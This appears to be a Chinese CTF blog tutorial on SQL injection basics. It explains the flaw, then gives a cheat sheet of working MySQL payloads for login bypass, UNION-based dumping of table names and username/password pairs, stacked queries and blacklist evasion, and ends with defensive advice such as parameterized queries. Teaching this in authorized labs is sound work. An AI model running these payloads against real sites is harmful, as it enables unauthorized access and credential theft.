---
title: SQL 注入基础：原理、流程速查与防护
date: 2026-10-22 19:00:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - UNION 注入
  - information_schema
  - 入门基础
description: SQL 注入入门笔记：漏洞是怎么产生的、必须记住的符号、字符型与数字型的判断、URL 编码，以及 UNION 注入的完整流程速查、常见问题和防护建议。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 0
permalink: 2026/10/22/web-knowledge-sql-basics/
---

{% note info %}
**阅读说明**

- **难度**：入门（第 3 篇涉及堆叠注入，稍难一点）
- **前置知识**：HTTP 请求、`SELECT` 基础、浏览器开发者工具（F12）；第 3 篇会用到 Burp Suite 的 Intruder 模块，不熟悉的话用 F12 手动改包也能跟上
- **环境**：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 sqli-labs）。
- 本文所有测试仅用于**授权靶场和教学**，请勿对未授权的站点进行任何测试。
{% endnote %}

## SQL 注入是怎么产生的

很多老系统会把用户输入直接拼进 SQL 字符串，例如下面这种错误写法：

```php
$sql = "SELECT id, username, password FROM users
        WHERE username='$username' AND password='$password'";
```

如果用户输入 `username = ' or 1=1#`，最终执行的语句就变成了：

```sql
SELECT id, username, password FROM users
WHERE username='' or 1=1#' AND password=''
```

`1=1` 永远为真，`#` 又把它后面的密码判断注释掉了，于是不输入正确密码也能登录。这就是最经典的**万能密码**。

一句话理解：**SQL 注入就是让用户输入"越界"，从数据变成 SQL 代码。**

## 三个必须记住的符号

| 符号 | 作用 | 例子 |
| --- | --- | --- |
| `'` | 闭合原 SQL 中的字符串 | `1'` |
| `#` | MySQL 注释，注释掉后面的内容 | `1' or 1=1#` |
| `or` / `\|\|` | 逻辑或，只要一边为真结果就为真 | `1' or 1=1#` |

> 注释除了 `#`，还可以用 `-- `（**两个减号后面必须跟一个空格**）和 `/* */`。

## 字符型还是数字型？

这是新手最容易卡住的一步。两种情况的闭合方式不同：

- **数字型**：`WHERE id = $id`，输入 `1 and 1=1` 正常，`1 and 1=2` 查不到数据。
- **字符型**：`WHERE username = '$username'`，需要先用 `'` 闭合：`1' and '1'='1` 正常，`1' and '1'='2` 查不到数据。

{% note warning %}
只加一个单引号导致报错，只能说明**这个位置存在注入**，不能直接下结论说是数字型还是字符型。真正的判断标准是：**你构造的闭合语句能不能让页面恢复正常**。
{% endnote %}

## 记得做 URL 编码

`GET` 请求的参数在地址栏里传输，特殊字符会被浏览器或服务器解释，所以要编码：

| 原字符 | URL 编码 | 说明 |
| --- | --- | --- |
| `'` | `%27` | 不编码可能被截断 |
| `\|` | `%7C` | 两个竖线就是 `%7C%7C` |
| `#` | `%23` | **最容易踩坑**：不编码的话，浏览器会把 `#` 后面的内容当成页面锚点，根本不会发给服务器 |
| 空格 | `%20` 或 `+` | 需要空格的 payload 要编码 |

例如 `1'||1#` 编码后就是：

```text
1%27%7C%7C1%23
```

## 完整流程速查表

| 步骤 | 目的 | 示例 payload |
| --- | --- | --- |
| 1 | 判断是否有注入 | `1'` 看是否报错 |
| 2 | 判断闭合方式 | `1' and '1'='1` / `1' and '1'='2` |
| 3 | 万能密码登录 | `1'||1#` |
| 4 | 确定列数 | `1' order by 3#`；`1' union select 1,2,3#` |
| 5 | 找回收显位 | 页面显示的数字就是回显列 |
| 6 | 爆数据库 | `1' union select 1,database(),3#` |
| 7 | 爆表名 | `... from information_schema.tables where table_schema=database()#` |
| 8 | 爆字段名 | `... from information_schema.columns where table_name='l0ve1ysq1'#` |
| 9 | 拖数据 | `... group_concat(username,0x3a,password) from l0ve1ysq1#` |
| 10 | `UNION` 走不通时，先探过滤 | `1'` 看有没有 `Nonono.` 之类的黑名单提示 |
| 11 | 爆破黑名单 | Burp Intruder 载入符号/关键字字典，比对响应 |
| 12 | 堆叠注入 | `1;show tables;` |
| 13 | 反推后端结构 | 对照 `1`、`1;select 1;`、`1;select a;` 的回显差异 |
| 14 | 绕过关键字过滤 | `*,1`；或 `set sql_mode=PIPES_AS_CONCAT` |

> 前 9 步对应 EasySQL 和 LoveSQL，第 10~14 步对应 SUCTF EasySQL。

## 新手常见问题

**Q1：为什么 `#` 一定要写成 `%23`？**

浏览器地址栏里 `#` 表示页面锚点，后面的内容不会发送给服务器。`1'||1#` 直接写进 URL，服务器只能收到 `1'||1`，当然失败。用 `%23` 或者用 Burp Suite、curl 发包都可以避免这个问题。

**Q2：报 `different number of columns` 怎么办？**

`UNION` 前后列数不一致。先用 `order by N` 二分确定原查询列数，或者在 `union select` 后面补/删逗号。

**Q3：`union select` 有结果，但页面不显示？**

说明数据放在了不回显的列（这道题的第 1 列）。把要显示的内容移到第 2 或第 3 列。

**Q4：`group_concat` 结果被截断了？**

MySQL 的 `group_concat_max_len` 默认是 1024 字节。可以用 `substr()` 分段读取：

```text
1' union select 1,substr(group_concat(username,0x3a,password),1,1024),3 from l0ve1ysq1#
```

把 `1` 改成 `1025`、`2049`，继续往后读即可。

**Q5：payload 明明一样，为什么我失败？**

检查这几点：引号是不是中文引号、`||` 是不是中文全角、`#` 有没有编码、`--` 后面有没有空格、`union select` 的列数对不对。

**Q6：靶场地址打不开了？**

这类在线靶场地址是临时分配的，过期就失效。可以自己在本地搭 sqli-labs，或用其他公开靶场练习，payload 的思路是一样的。

**Q7：页面回 `Nonono.` 是什么意思？**

说明你的输入命中了后端的黑名单，请求根本没进数据库。这时继续换 payload 意义不大，应该先用 Intruder 之类的工具把"哪些字符能用"摸清楚。

**Q8：分号能用，为什么还是执行不了第二条语句？**

PHP 的 `mysqli_query()` 只执行第一条语句，多出来的部分会被直接忽略。只有当后端使用 `mysqli_multi_query()` 或 PDO 的 `exec()` 时，堆叠注入才成立。所以看到 `;` 没被过滤只是**必要条件**，最终要拿 `1;select 1;` 之类的东西实测一下。

**Q9：`||` 到底是"或"还是"拼接"？**

看 `sql_mode`。默认是逻辑或；带上 `PIPES_AS_CONCAT` 时是字符串连接。同一句 SQL 在两种模式下结果可能完全不同，做题时看到回显不对劲，可以先确认这个设置。

## 顺手聊聊怎么防

做题是为了理解攻击，写代码时要避免同样的错误：

1. **使用预编译语句（参数化查询）**，不要拼接字符串：

```php
$stmt = $pdo->prepare(
    'SELECT id, username FROM users WHERE username = ? AND password = ?'
);
$stmt->execute([$username, $password]);
```

2. **输入做白名单校验**，比如 id 只允许数字。
3. **数据库账号最小权限**，Web 账号不要有 `FILE`、跨库查询等权限。
4. **不要把数据库报错直接回显给用户**，错误信息会帮助攻击者判断注入类型和列数。
5. **密码加盐哈希存储**，不要明文或简单 MD5。
6. **不要指望黑名单**。SUCTF 那篇已经演示得很清楚：拦掉 `flag` 三个字母，照样能用 `*` 把整张表取出来；拦掉 `union`，还有堆叠注入。黑名单是在和攻击者比拼想象力，永远追不上。
7. **关掉不需要的能力**：数据库账号不给多语句执行权限，`sql_mode` 不要随意开放 `PIPES_AS_CONCAT`，都能顺手缩小攻击面。
